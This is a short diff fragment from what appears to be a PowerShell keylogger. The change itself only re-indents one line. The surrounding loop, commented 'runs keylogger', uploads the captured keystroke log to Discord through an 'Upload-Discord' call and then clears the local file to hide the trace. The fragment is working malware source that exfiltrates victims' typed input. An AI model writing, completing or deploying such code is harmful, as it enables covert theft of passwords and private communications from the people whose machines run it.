@@ -77,7 +77,7 @@ while ($true) {
   
             # runs keylogger
 	    Upload-Discord -file $Path
-        echo "" > $Path 
+            echo "" > $Path 
             
 			
         }
